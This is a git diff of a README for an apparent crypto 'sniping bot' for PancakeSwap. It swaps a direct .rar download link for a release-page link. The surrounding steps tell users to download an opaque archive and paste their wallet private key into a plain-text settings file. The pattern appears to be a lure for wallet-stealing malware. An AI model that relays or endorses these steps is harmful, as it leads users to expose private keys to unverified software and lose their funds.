@@ -4,7 +4,7 @@ Full version sniping bot used to snipe during fair coin launches. With advanced 
 
 <H2>Getting started</H2>
 
-1. Download the latest release from <a href="https://github.com/YisusCripto/windows-SNIPERBOT-for-Pancakeswap-and-Other-DEX/releases/download/v2.6/Snipebot.v26.rar">"HERE"</a>. ```(verify that the downloaded file has a size of around 40mb, otherwise your downloaded file will be corrupt)```
+1. Download the latest release from <a href="https://github.com/YisusCripto/windows-SNIPERBOT-for-Pancakeswap-and-Other-DEX/releases/tag/v2.6">"HERE"</a>. ```(verify that the downloaded file has a size of around 40mb, otherwise your downloaded file will be corrupt)```
 2. Open "usersetting.ini" (with notepad for instance) and add your ethereum/bsc address and private key in the corresponding fields after the equal (=). 
 <pre>address=0x0000000000000000000000000000000000000000
 privatekey=00000000000000000000000000000000000000000000000000</pre>
